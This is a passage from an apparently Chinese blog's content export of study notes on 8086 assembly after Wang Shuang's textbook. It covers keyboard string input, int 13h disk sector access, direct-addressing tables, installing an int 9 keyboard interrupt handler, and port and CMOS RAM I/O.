12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758charstack:jmp short charstarttable dw charpush,charpop,charshowtop dw 0 ;栈顶charstart:push bx push dx push di push es cmp ah,2 ja sret ;比较功能号，大于2则执行结束 mov bl,ah mov bh,0 add bx,bx jmp word ptr table[bx] ;调用相应子程序 charpush:mov bx,top ;字符入栈 mov [si][bx],al inc top jmp sret charpop:cmp top,0 je sret ;若栈空，执行结束(等于则转移) dec top ;栈顶减1，字符出栈 mov bx,top mov al,[si][bx] jmp sret charshow:mov bx,0b800h mov es,bx mov al,160 mov ah,0 mul dh ;无符号乘法 mov di,ax add dl,dl mov dh,0 add di,dx mov bx,0 charshows:cmp bx,top jne noempty ;不等于则转移 mov byte ptr es:[di],&apos; &apos; jmp sret noempty:mov al,[si][bx] mov es:[di],al mov byte ptr es:[di+2],&apos; &apos; inc bx add di,2 jmp charshows sret: pop es pop di pop dx pop bx ret 完整的接收字符串输入的子程序 12345678910111213141516171819202122232425262728293031getstr: push axgetstrs:mov ah,0 int 16h cmp al,20h jb nochar ;ASCII码小于20h，说明不是字符 mov ah,0 call charstack ;字符入栈 mov ah,2 call charstack ;显示栈中的字符 jmp getstrs nochar: cmp ah,0eh ;比较退格键的扫描码 je backspace cmp ah,1ch ;比较Enter的扫描码 je enter jmp getstrs backspace:mov ah,1 call charstack ;字符出栈 mov ah,2 call charstack ;显示栈中的字符 jmp getstrsenter: mov al,0 mov ah,0 call charstack ;0入栈 mov ah,2 call charstack ;显示栈中的字符 pop ax ret 应用int 13h中断例程对磁盘进行读写以3.5英寸软盘为例 3.5英寸软盘分为上下两面，每面80个磁道，每个磁道分为18个扇区，每个扇区大小为512个字节 2面*80磁道*18扇区*512字节=1440KB≈1.44MB 磁盘的实际访问由磁盘控制器进行，可以通过控制磁盘控制器来访问磁盘 只能以扇区为单位对磁盘进行读写，在读写扇区过程中，要提供面号、磁道号、扇区号。面号和磁道号从0开始，扇区号从1开始 通过调用BIOS提供的访问磁盘的中断例程int 13h来访问磁盘 读取0面0道1扇面的内容到0:200入口参数： (ah)=int 13h的功能号(2表示读扇区) (al)=读取的扇区数 (ch)=磁道号 (cl)=扇区号 (dh)=磁头号(即面号) (dl)=驱动器号(软驱从0开始，0为软驱A，1为软驱B)(硬盘从80h开始，80h为硬盘C，81h为硬盘D) es:bx指向接收从扇区读入数据的内存区 返回参数： 操作成功：(ah)=0，(al)=读入的扇区数 操作失败：(ah)=出错代码 123456789101112mov ax,0mov es,axmov bx,200h ;es:bx指向接收内存mov al,1 ;读取的扇区数mov ch,0 ;磁道号mov cl,1 ;扇区号mov dl,0 ;驱动器号mov dh,0 ;磁头号(面号)mov ah,2 ;int 13h的功能号2，读扇区int 13h 将0:200中的内容写入0面0道1扇区入口参数： (ah)=int 13h的功能号(3表示读扇区) (al)=写入的扇区数 (ch)=磁道号 (cl)=扇区号 (dh)=磁头号(即面号) (dl)=驱动器号(软驱从0开始，0为软驱A，1为软驱B)(硬盘从80h开始，80h为硬盘C，81h为硬盘D) es:bx指向将写入磁盘的内存单元 返回参数： 操作成功：(ah)=0，(al)=写入的扇区数 操作失败：(ah)=出错代码 123456789101112mov ax,0mov es,axmov bx,200h ;es:bx指向要写入的内存单元mov al,1 ;写入的扇区数mov ch,0 ;磁道号mov cl,1 ;扇区号mov dl,0 ;驱动器号mov dh,0 ;磁头号(面号)mov ah,3 ;int 13h的功能号3，写扇区int 13h 编程:将当前屏幕的内容保存到磁盘上分析： 一屏的内容占4000个字节，需要8个扇区，用0面0道的1–8扇区存储显存中的内容 123456789101112131415161718192021assume cs:codecode segmentstart: mov ax,0b800h mov es,ax mov bx,0 ;es:bx指向显存单元 mov al,8 ;写入的扇区数 mov ch,0 ;磁道号 mov cl,1 ;扇区号 mov dl,0 ;驱动器号 mov dh,0 ;磁头号(面号) mov ah,3 ;int 13h的功能号3，写扇区 int 13h mov ax,4c00h int 21h code endsend start 逻辑扇区编号使用面号、磁道号、扇区号来范问磁盘不太方便。可以对位于不同的磁道、面上的所有扇区进行统一编址。编号从0开始，一直到2879，称为逻辑扇区编号 编号方法： 物理扇区号 逻辑扇区号 0面0道1扇区 0 0面0道2扇区 1 0面0道3扇区 2 0面0道4扇区 3 … … 0面0道18扇区 17 0面1道1扇区 18 0面1道2扇区 19 … … 0面79道18扇区 1439 1面0道1扇区 1440 … … 逻辑扇区号和物理扇区号关系：逻辑扇区号=(面号*80+磁道号)*18+扇区号-1 根据逻辑扇区号计算出物理编号： int()：描述性运算符，取商 rem()：描述性运算符，取余数 逻辑扇区号=(面号*80+磁道号)*18+扇区号-1 面号=int(逻辑扇区号/1440) 磁道号=int(rem(逻辑扇区号/1440)/18) 扇区号=rem(rem(逻辑扇区号/1440)/18)+1]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-直接定址表]]></title>
    <url>%2F2019%2F04%2F28%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E7%9B%B4%E6%8E%A5%E5%AE%9A%E5%9D%80%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[如何有效的组织数据，以及相关的编程技术 描述了单元长度的标号在代码段中经常使用标号来标记指令、数据、段的起始地址 123456assume cs:codecode segmenta: db 1,2,3,4,5,6,7,8b: dw 0code endsend a、b这些标号仅仅表示了内存单元的地址 另一种标号，不但可以表示内存单元的地址，还可表示内存单元的长度，即表示在此标号处的单元，是字节单元还是字单元，或者双字单元 123456assume cs:codecode segment a db 1,2,3,4,5,6,7,8 b dw 0code endsend a或者b是同时描述内存地址和单元长度的标号 标号a，描述了地址code:0，而且从这个地址开始，以后的内存单元都是字节单元 标号b，描述了地址code:8，而且从这个地址开始，以后的内存单元都是字单元 这种标号包含了对单元长度的描述，所以在指令中，此种标号可以代表一个段中的内存单元 例：b dw 0 指令：mov ax,b 相当于：mov ax,cs:[8] 指令：mov b,2 相当于：mov word ptr cs:[8],2 指令：mov al,b会引起编译错误，因为b代表的内存单元是字单元，而al是8位寄存器 例：a db 1,2,3,4,5,6,7,8 指令：mov al,a[si] 相当于：mov al,cs:0[si] 这种标号称为数据标号，它标记了存储数据的单元的地址和长度，不同于仅表示地址的地址标号 在其他段中使用的数据标号一般来说，不再代码段中定义数据，而是将数据定义到其他段中 在其他段中，也可以使用数据标号来描述存储数据的单元的地址和长度 注意：在后面加有“:”的地址标号，只能在代码段中使用，不能在其他段中使用 例：将data段中a标号处的8个数据累加，结果存储到b标号处的字中 123456789101112131415161718192021222324assume cs:code,ds:datadata segment a db 1,2,3,4,5,6,7,8 b dw 0data endscode segmentstart: mov ax,data mov ds,ax mov si,0 mov cx,8 s: mov al,a[si] mov ah,0 add b,ax inc si loop s mov ax,4c00h int 21hcode endsend start 若在代码段中直接使用数据标号访问数据，则需使用伪指令assume将标号所在的段和一个段寄存器联系起来，否则在编译器编译的时候，无法确定标号的段地址在哪一个寄存器中(ds:data) 但并不是用assume指令将段寄存器和某个段相联系后，段寄存器就会真的存放该段的地址，而要在程序中使用指令对段寄存器进行设置(mov ax,data、mov ds,ax) 将标号当作数据来定义可以将标号当作数据来定义，此时，编译器将标号所表示的地址当作数据的值 例： 12345data segment a db 1,2,3,4,5,6,7,8 b dw 0 c dw a,bdata ends 数据标号c处存储了两个字型数据,为标号a、b的偏移地址。相当于： 12345data segment a db 1,2,3,4,5,6,7,8 b dw 0 c dw offset a,offset bdata ends 例： 12345data segment a db 1,2,3,4,5,6,7,8 b dw 0 c dd a,bdata ends 数据标号c处存储了两个双字型数据，为标号a的偏移地址和段地址、标号b的偏移地址和段地址。相当于： 12345data segment a db 1,2,3,4,5,6,7,8 b dw 0 c dw offset a,seg a,offset b,seg bdata ends seg操作符，功能为取得某一标号的段地址 直接定址表用查表的方法编写相关程序的技巧 编写子程序，用十六进制的形式在屏幕中间显示给定的字节型数据分析： 一个字节，在寄存器中以8位二进制方式存储，首先转换为其十六进制，然后将这个十六进制显示在屏幕上 一个字节需两个十六进制数码来表示(一个字节为8位二进制，一个十六进制表示4位二进制)，所以，子程序须在屏幕上显示两个ASCII字符，使用0--F来显示十六进制数码 可将一个字节的高4位和低4位分开，分别用它们的值得到对应的数码字符 希望能够在数值0–15和字符0--F之间找到一种映射关系 但数值0–9和字符0--9之间的映射关系是：数值+30h=对应字符的ASCII值 数值10–15和字符A--F之间的映射关系是：数值+37h=对应字符的ASCII值 具体做法是：建立一张表，表中依次存储字符0--F，通过数值0–15直接查找到对应的字符 12345678910111213141516171819202122232425262728293031;用al传送要显示的数据showbyte:jmp short show table db &apos;0123456789ABCDEF&apos; ;建立字符表 show: push bx push es mov ah,al shr ah,1 shr ah,1 shr ah,1 shr ah,1 ;右移4位，ah中得到高4位的值 and al,00001111b ;al中为低4位的值 mov bl,ah mov bh,0 mov ah,table[bx] ;用高4位的值作为相对于table的偏移，取得对应的字符 mov bx,0b800h mov es,bx mov es:[160*12+40*2],ah ;显示高4位对应十六进制数码 mov bl,al mov bh,0 mov al,table[bx] ;用低4位的值作为相对于table的偏移，取得对应的字符 mov es:[160*12+40*2+2],al ;显示低4位对应十六进制数码 pop es pop bx ret 在子程序中，在数值0–15和字符0--F之间建立的映射关系为：以数值N为table表中的偏移，可以找到对应的字符 利用表，在两个数据集合之间建立一种映射关系，使得可以使用查表的方法根据给出的数据得到其在另一集合中的对应数据。这么做的目的有： 为了算法的清晰和简洁 为了加快运算速度 为了使程序易于扩充 编写一个子程序，计算sin(x),xϵ{0&deg;,30&deg;,60&deg;,90&deg;,120&deg;,150&deg;,180&deg;}，并在屏幕中间显示计算结果若使用麦克劳林公式进行计算，其中涉及多次乘法和除法。乘除是非常费时的运算，执行的时间大约是加法、比较等指令的5倍 可以使用一些存储空间换取运算的速度，将计算的sin(x)的结果存储到一张表中，然后用角度值来查表，找到对应的sin(x)的值 123456789101112131415161718192021222324252627282930313233343536373839;用ax向子程序传递角度showsin:jmp short show table dw ag0,ag30,ag60,ag90,ag120,ag150,ag180 ;字符串偏移地址表 ag0 db &apos;0&apos;,0 ;sin(0)对应的字符串“0” ag30 db &apos;0.5&apos;,0 ;sin(30)对应的字符串“0.5” ag60 db &apos;0.866&apos;,0 ;sin(60)对应的字符串“0.866” ag90 db &apos;1&apos;,0 ;sin(90)对应的字符串“1” ag120 db &apos;0.866&apos;,0 ;sin(120)对应的字符串“0.866” ag150 db &apos;0.5&apos;,0 ;sin(150)对应的字符串“0.5” ag180 db &apos;0&apos;,0 ;sin(180)对应的字符串“0” show: push bx push es push si mov bx,0b800h mov es,bx ;用角度值/30作为相对于table的偏移，取得对应字符串的偏移地址，放在bx中 mov ah,0 mov bl,30 div bl mov bl,al mov bh,0 add bx,bx mov bx,table[bx] ;以下显示sin(x)对应的字符串 mov si,160*12+40*2shows: mov ah,cs:[bx] cmp ah,0 je showret mov es:[si],ah inc bx add si,2 jmp short showsshowret:pop si pop es pop bx ret 子程序中，在角度值X和表示sin(x)的字符串集合table之间建立的映射关系为：以角度/30为table表中的偏移，可以找到对应的字符串的首地址 通过将给出的数据进行计算或比较而得到结果的问题，转化为用给出的数据作为查表的依据，通过查表得到结果的问题 具体的查表的方法，是用查表的依据数据，直接计算出所要查找的元素在表中的位置 像这种可以通过依据数据，直接计算出所要找的元素的位置的表，称为直接定址表 程序入口地址的直接定址表可以直接在直接定址表中存储子程序的地址，方便的实现不同子程序的调用 实现一个子程序setscreen，为显示输出提供如下功能 清屏 设置前景色 设置背景色 向上滚动一行 入口参数： ah寄存器传递功能号：0表示清屏，1表示设置前景色，2表示设置背景色，3表示向上滚动一行 对于2，3号功能，用al传送颜色值，(al)ϵ{0,1,2,3,4,5,6,7} 功能实现： 清屏：将显存中当前屏幕中的字符设为空格符 设置前景色：设置显存中当前屏幕中处于奇地址的属性字节的第0、1、2位 设置背景色：设置显存中当前屏幕中处于奇地址的属性字节的第4、5、6位 向上滚动一行：依次将第n+1行的内容复制到第n行；最后一行为空 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990;清屏sub1: push bx push cx push es mov bx,0b800h mov es,bx mov bx,0 mov cx,2000sub1s: mov byte ptr es:[bx],&apos; &apos; ;将用于显示的字节置为空格 add bx,2 loop sub1s pop es pop cx pop bx ret ;设置前景色sub2: push bx push cx push es mov bx,0b800h mov es,bx mov bx,1 mov cx,2000sub2s: and byte ptr es:[bx],11111000b ;将字符属性字节0,1,2位置为0 or es:[bx],al ;al中存储设置的前景色，将其设置到字符属性字节中 add bx,2 loop sub2s pop es pop cx pop bx ret ;设置背景色sub3: push bx push cx push es mov cl,4 shl al,cl ;颜色值左移四位，用于设置背景色 mov bx,0b800h mov es,bx mov bx,1 mov cx,2000sub3s: and byte ptr es:[bx],10001111b ;将字符属性字节5,6,7位置为0 or es:[bx],al ;al中存储设置的前景色，将其设置到字符属性字节中 add bx,2 loop sub3s pop es pop cx pop bx ret ;向上滚动一行sub4: push cx push si push di push es push ds mov si,0b800h mov es,si mov ds,si mov si,160 ;ds:si指向第n+1行第一个字符，每行80字符，加上字符属性设置字节，共160字符 mov di,0 ;es:di指向第n行第一个字符 cld ;正向传送 mov cx,24 ;共复制24行sub4s: push cx mov cx,160 rep movsb ;行中的每一个字符进行复制 pop cx loop sub4s mov cx,80 ;只需修改存储字符的字节 mov si,0sub4s1: mov byte ptr [160*24+si],&apos; &apos; ;最后一行清空 add si,2 loop sub4s1 pop ds pop es pop di pop si pop cx ret 将这些功能子程序的入口地址存储在一个表中，它们在表中的位置和功能号相对应。对应关系为：功能号*2=对应的功能子程序在地址表中的偏移 12345678910111213setscreen:jmp short set table dw sub1,sub2,sub3,sub4 set: push bx cmp ah,3 ;功能号与3进行比较 ja sret ;高于则转移 mov bl,ah mov bh,0 add bx,bx ;根据ah中的功能号计算对应子程序在table表中的偏移 call word ptr table[bx] ;调用对应的功能子程序sret: pop bx ret]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-外中断]]></title>
    <url>%2F2019%2F04%2F25%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%A4%96%E4%B8%AD%E6%96%AD%2F</url>
    <content type="text"><![CDATA[CPU除了有运算能力外，还要有I/O能力 要及时处理外设的输入，显然需要解决两个问题： 外设的输入随时可能发生，CPU如何得知？ CPU从何处得到外设的输入？ 接口芯片和端口外设的输入不直接送入内存和CPU，而是送入相关的接口芯片的端口中 CPU向外设的输出也不是直接送入外设，而是先送入端口中，再由相关的芯片送到外设 CPU还可以向外设输出控制命令，这些控制命令先送到相关芯片的端口中，然后再由相关的芯片根据命令对外设实施控制 可见，CPU通过端口和外部设备进行联系 外中断信息除了内中断外，还有一种中断信息，来自于CPU外部，当CPU外部有需要处理的事情发生时，相关芯片会向CPU发出相应的中断信息。CPU在执行完当前指令后，可以检测到发送过来的中断信息，引发中断过程，处理外设的中断 在PC系统中，外中断源分为： 可屏蔽中断 不可屏蔽中断 可屏蔽中断CPU可以不响应的外中断 CPU是否响应可屏蔽中断，取决于标志寄存器IF位的设置 当CPU检测到可屏蔽中断信息时，若IF=1，则CPU在执行完当前指令后响应中断，引发中断过程；若IF=0，则不响应可屏蔽中断 可屏蔽中断的中断过程： 通过数据总线将中断类型码n送入CPU 标志寄存器入栈，IF=0，TF=0 CS、IP入栈 (IP)=(n*4)，(CS)=(n*4+2) 中断过程将IF置为0的原因是：在进入中断处理程序后，禁止其他的可屏蔽中断 若在中断处理程序中需要处理可屏蔽中断，可用指令将IF置1 8086CPU提供的设置IF的指令为： 12sti ;IF置为1cli ;IF置为0 不可屏蔽中断不可屏蔽中断是CPU必须响应的外中断 当CPU检测到不可屏蔽中断信息时，则在执行完当前指令后，立即响应，引发中断过程 对于8086CPU，不可屏蔽中断的中断类型码固定为2 不可屏蔽中断的中断过程： 标志寄存器入栈，IF=0，TF=0 CS、IP入栈 (IP)=(8)，(CS)=(0AH) 几乎所有由外设引发的外中断，都是可屏蔽中断 当外设有需要处理的事件发生时，相关芯片向CPU发出可屏蔽中断信息 不可屏蔽中断是在系统中有必须处理的紧急情况发生时用来通知CPU的中断信息 PC机键盘的处理过程键盘输入键盘上的每一个键相当于一个开关，键盘中有一个芯片对键盘上的每一个键的开关状态进行扫描 按下一个键时，开关接通，该芯片就产生一个扫描码，扫描码说明了按下的键在键盘上的位置。扫描码被送入主板上的相关接口芯片的寄存器中，该寄存器的端口地址为60h 松开按下的键时，也产生一个扫描码，扫描码说明了松开的键在键盘上的位置。松开按键时产生的扫描码也被送入60h端口中 按下一个键时产生的扫描码称为通码，松开一个键产生的扫描码称为断码 扫描码长度为一个字节，通码的第7位为0，断码的第7位为1，即：断码=通码+80h 键盘中部分键的扫描码通码： 引发9号中断键盘的输入到达60h端口时，相关芯片就会向CPU发出中断类型码为9的可屏蔽中断信息 CPU检测到该中断信息后，若IF=1，则响应中断，引发中断过程，转去执行int 9中断例程 执行int 9中断例程BIOS提供了int 9中断例程，用于进行基本的键盘输入处理 int 9中断例程主要工作： 读出60h端口中的扫描码 若是字符键的扫描码，将该扫描码和所对应的字符码(ASCII码)送入内存中的BIOS键盘缓冲区 若是控制键和切换键的扫描码，则将其转变为状态字节(用二进制位记录控制键和切换键状态的字节)写入内存中存储状态字节的单元 对键盘系统进行相关的控制，例：向相关芯片发出应答信息 BIOS键盘缓冲区是系统启动后，BIOS用于存放int 9中断例程所接收的键盘输入的内存区。该内存区可以存储15个键盘输入。 在BIOS键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码 0040:17单元存储键盘状态字节，该字节记录了控制键和切换键的状态 键盘状态字节各位记录的信息为： 位 表示 信息 0 右shift状态 置1表示按下 1 左shift状态 置1表示按下 2 Ctrl状态 置1表示按下 3 Alt状态 置1表示按下 4 ScrollLock状态 置1表示Scroll指示灯亮 5 NumLock状态 置1表示小键盘输入的是数字 6 CapsLock状态 置1表示输入大写字母 7 Insert状态 置1表示处于删除态 编写int 9中断例程键盘输入的处理过程： 键盘产生扫描码 扫描码送入60h端口 引发9号中断 CPU执行int 9中断例程处理键盘输入 第1-3步由硬件系统完成，可控的部分仅为int 9中断处理程序 程序需调用原int 9中断例程去处理硬件细节 编程:在屏幕中间依次显示”a”–”z”，在显示过程中，按下Esc键，改变显示颜色依次显示”a”–”z”123456789101112131415assume cs:codecode segmentstart: mov ax,0b800h mov es,ax mov ah,&apos;a&apos; s: mov es:[160*12+40*2],ah ;显示 inc ah cmp ah,&apos;z&apos; ;比较当前字符与z jna s ;不高于z则转移，继续循环 mov ax,4c00h int 21hcode endsend start 程序执行，无法看清屏幕上的显示。因CPU执行过快，一个字母刚显示，CPU执行几条指令后，就会变为另一个字母 程序执行，设置显示延后当显示一个字母后，让CPU执行一段时间的空循环 CPU速度较快，所以空循环的次数一定要大，需要使用16位寄存器来存放32位的循环次数 12345678 mov dx,10h mov ax,0s: sub ax,1 ;(ax)=(ax)-1 不带借位减法 sbb dx,0 ;(dx)=(dx)-0-CF 带借位减法 cmp ax,0 ;比较 jne s ;不等于则转移 cmp dx,0 jne s 以上程序，循环100000h次 实现按Esc键后，改变显示颜色键盘输入到达60h端口后，引发9号中断，CPU转去执行int 9中断例程 重新编写int 9中断例程，功能： 从60h端口中读出键盘的输入 调用BIOS的int 9中断例程，处理其他硬件细节 判断是否为Esc的扫描码，若是，改变颜色后返回；若不是，直接返回 从端口60h读出键盘的输入1in al,60h ;in指令只可使用al或ax接收数据 调用BIOS的int 9中断例程重新写的中断处理程序要成为新的int 9中断例程，主程序需将中断向量表中的int 9中断例程的入口地址改为新中断处理程序的入口地址。则在新中断例程调用原int 9中断例程时，中断向量表中的int 9中断例程并非原中断例程，所以不可使用int指令直接调用 必须在将中断向量表中的中断例程入口地址更改之前，将原入口地址保存 不能使用int 9指令调用原中断例程，使用另外的指令模拟int指令，实现对原中断例程的调用 int指令执行时，CPU的工作： 取中断类型码n 标志寄存器入栈 IF=0，TF=0 CS、IP入栈 (IP)=(n*4)，(CS)=(n*4+2) 取中断类型码是为了定位中断例程的入口地址，此时我们保存了原中断例程的入口地址，所以不需要第一步 使用pushf替代第二步 使用以下程序替代第三步 12345pushfpop axand ah,11111100b ;将IF和TF(第9位与第8位)置为0push axpopf 使用call dword ptr xxx替代第四步，第五步 若是Esc的扫描码，改变显示的颜色后返回显示的位置是屏幕的中间，即第12行40列，所以字符的ASCII码送入段地址b800h，偏移地址160*12+40*2处。而段地址b800h，偏移地址160*12+40*2+1处为字符的属性，改变此处的数据即可改变字符的颜色 在此程序返回前，将中断向量表中int 9中断例程的入口地址恢复为原来的地址 完整程序如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192assume cs:codestack segment db 128 dup (0)stack endsdata segment dw 0,0data endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 ;ss:sp指向栈顶 mov ax,data mov ds,ax ;用于存放原中断例程入口地址 mov ax,0 mov es,ax push es:[9*4] pop ds:[0] push es:[9*4+2] pop ds:[2] ;通过栈将原int 9中断例程入口地址保存在ds:0、ds:2内存单元中 mov word ptr es:[9*4],offset int9 ;在中断向量表中设置新int 9中断例程偏移地址 mov es:[9*4+2],cs ;在中断向量表中设置新int 9中断例程段地址 mov ax,0b800h mov es,ax mov ah,&apos;a&apos; s: mov es:[160*12+40*2],ah ;显示字母 call delay ;显示延后 inc ah cmp ah,&apos;z&apos; ;比较 jna s ;不高于则转移 mov ax,0 mov es,ax push ds:[0] pop es:[9*4] push ds:[2] pop es:[9*4+2] ;通过栈恢复原int 9中断例程的入口地址 mov ax,4c00h int 21h delay: push ax ;设置显示延后 push dx mov dx,1000h mov ax,0 sl: sub ax,1 sbb dx,0 cmp ax,0 jne s1 cmp dx,0 jne s1 pop dx pop ax ret int9: push ax ;新int 9中断例程 push bx push es in al,60h ;取键盘输入 ;模拟int功能，调用原int 9中断例程 pushf ;标志寄存器入栈 pushf ;标志寄存器入栈，用于修改 pop bx and bh,11111100b ;修改IF、TF的值 push bx popf ;修改后的标志寄存器出栈 call dword ptr ds:[0] ;CS、IP入栈；(IP)=((ds)*16+0)，(CS)=((ds)*16+2) cmp al,1 ;Esc扫描码为01，比较键盘是否为Esc扫描码 jne int9ret ;不等于则结束新int 9中断例程 mov ax,0b800h ;改变字符颜色 mov es,ax inc byte ptr es:[160**12+40*2+1] int9ret:pop es pop bx pop ax iretcode endsend start 关于键盘的程序，因直接访问真实的硬件，需在DOS实模式下运行 安装新的int 9中断例程安装一个新的int 9中断例程，使得原int 9中断例程功能得到扩展 功能：在DOS下，按F1键改变当前屏幕的显示颜色，其他键无改变 改变屏幕的显示颜色改变从b8000h开始的4000个字节中的所有奇地址单元中的内容，当前屏幕显示颜色即发生改变 1234567 mov ax,0b800h mov es,ax mov bx,1 mov cx,2000s: inc byte ptr es:[bx] add bx,2 loop s 其他键无改变可以调用原int 9中断处理程序，用于处理其他的键盘输入 原int 9中断例程入口地址的保存因新编写的int 9中断例程中需使用到原int 9中断例程，所以，要保存原int 9中断例程的入口地址 不可保存在安装程序中，因安装程序返回后地址将丢失。将地址保存在0:200单元中 新int 9中断例程的安装将新的int 9中断例程安装在0:204处 完整程序如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273assume cs:codestack segment db 128 dup (0)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 ;ss:sp指向栈顶 push cs pop ds ;将cs的内容通过栈赋给ds mov ax,0 mov es,ax mov si.offset int9 ;ds:si指向源地址 mov di,204h ;es:di指向目的地址 mov cx,offset int9end-offset int9 ;cx为传输长度 cld ;正向传输 rep movsb ;串传送 push es:[9*4] pop es:[200h] push es:[9*4+2] pop es:[202h] ;通过栈将原int 9中断例程入口地址保存 cli ;IF置为0，禁止其他可屏蔽中断 mov word ptr es:[9*4],204h mov word ptr es:[9*4+2],0 ;在中断向量表中写入新int 9入口地址 sti ;IF置为1，允许其他可屏蔽中断 mov ax,4c00h int 21h int9: push ax ;保存需使用的寄存器 push bx push cx push es in al,60h ;获取键盘输入 ;模拟int功能，调用原int 9中断例程 pushf ;标志寄存器入栈 pushf ;标志寄存器入栈，用于修改 pop bx and bh,11111100b ;修改IF、TF的值 push bx popf ;修改后的标志寄存器出栈 call dword ptr cs:[200h] ;CS、IP入栈；(IP)=((cs)*16+200h+0)，(CS)=((cs)*16+200h+2)。此中断例程执行时(CS)=0 cmp al,3bh ;F1的扫描码为3bh，比较 jne int9ret ;不等于则转移 mov ax,0b800h ;更改屏幕颜色 mov es,ax mov bx,1 mov cx,2000 s: inc byte ptr es:[bx] add bx,2 loop s int9ret:pop es ;使用到的寄存器恢复 pop cx pop bx pop ax iret int9end:nopcode endsend start CPU对外设输入的通常处理方法： 外设的输入送入端口 向CPU发出外中断(可屏蔽中断)信息 CPU检测到可屏蔽中断信息，若IF=1，CPU在执行完当前指令后响应中断，执行相应的中断例程 可在中断例程中实现对外设输入的处理 指令系统总结数据传送指令实现寄存器和内存、寄存器和寄存器之间的单个数据传送 例：mov、push、pop、pushf、popf、xchg 算术运算指令实现寄存器和内存中的数据的算数运算 执行的结果影响标志寄存器的SF、ZF、OF、CF、PF、AF位 例：add、sub、abc、sbb、inc、dec、cmp、imul、idiv、aaa 逻辑指令例：and、or、not、xor、test、shl、shr、sal、sar、rol、ror、rcl、rcr 除not指令外，其他指令所执行的结果都影响标志寄存器的相关标志位 转移指令可以修改IP，或同时修改CS和IP的指令统称为转移指令 无条件转移指令，例：jmp 条件转移指令，例：jcxz、je、jb、ja、jnb、jna等 循环指令，例：loop 过程，例：call、ret、retf 中断，例：int、iret 处理机控制指令对标志寄存器或其他处理机状态进行设置 例：cld、std、cli、sti、nop、clc、cmc、stc、hlt、wait、esc、lock 串处理指令对内存中的批量数据进行处理 例：movsb、movsw、cmps、scas、lods、stos等 要方便的进行批量数据的处理，需和rep、repe、repne等前缀指令配合使用]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-端口]]></title>
    <url>%2F2019%2F04%2F24%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E7%AB%AF%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[各种存储器都和CPU的地址线、数据线、控制线相连。CPU在操控它们的时候，把它们都当作内存来对待，把它们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器称为内存地址空间 在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下3种芯片： 各种接口卡(网卡、显卡等)上的接口芯片，用于控制接口卡进行工作 主板上的接口芯片，CPU通过其对部分外设进行访问 其他芯片，用来存储相关的系统信息，或进行相关的输入输出处理 在这些芯片中，都有一组可以由CPU读写的寄存器。这些寄存器，它们物理上可能处于不同的芯片种，但它们在以下两点以上相同 都与CPU的总线相连 CPU对它们进行读或写时都通过控制线向它们所在的芯片发出端口读写的命令 从CPU的角度，将这些寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址 CPU可以直接读写3个地方的数据： CPU内部的寄存器 内存单元 端口 端口的读写在访问端口时，CPU通过端口地址来定位端口 端口地址和内存地址一样，通过地址总线来传送 在PC系统中，CPU最多可以定位64KB个不同的端口，则端口地址的范围是0-65535 端口的读写指令只有两条： in，从端口读取数据 out，往端口写入数据 访问内存时的总线信息1mov ax,ds:[8] 执行时与总线相关的操作： CPU通过地址线将地址信息8发出 CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据 存储器将8号单元中的数据通过数据线送入CPU 访问端口时的总线信息1in al,60h ;从60h号端口读入一个字节 执行时与总线相关的操作： CPU通过地址线将地址信息60h发出 CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据 端口所在的芯片将60h端口中的数据通过数据线送入CPU 在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位端口时用ax 对0-255以内的端口进行读写时： 12in al,20h ;从20h端口读入一个字节out 20h,al ;往20h端口写入一个字节 对256-65535的端口进行读写时，端口号放在dx中： 123mov dx,3f8h ;将端口号3f8h送入dxin al,dx ;从3f8h端口读入一个字节out dx,al ;向3f8h端口写入一个字节 CMOS RAM芯片CMOS芯片是一种低耗电存储器，其主要作用是用来存放BIOS中的设置信息以及系统时间日期。 此芯片的特征： 包含一个实时钟和一个有128个存储单元的RAM存储器(早期计算机为64个字节) 该芯片靠电池供电，关机后其内部的实时钟仍可工作，RAM中信息不丢失 128个字节的RAM中，内部实时钟占用0-0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。BIOS也提供了相关的程序，使我们可以在开机的时候配置CMOS RAM中的系统信息 该芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口来读写CMOS RAM 70h为地址端口，存放要访问的CMOS RAM单元的地址；71h为数据端口，存放从选定的CMOS RAM单元中读取的数据，或要写入到其中的数据 CPU对CMOS RAM的读写分两步进行 例：读CMOS RAM的2号单元 将2送入端口70h 从端口71h读出2号单元的内容 shl和shr指令逻辑移位指令 shl指令逻辑左移指令 功能： 将一个寄存器或内存单元中的数据向左移位 将最后移出的一位写入CF中 最低位用0补充 例： 12mov al,01001000bshl al,1 ;将al中的数据左移一位 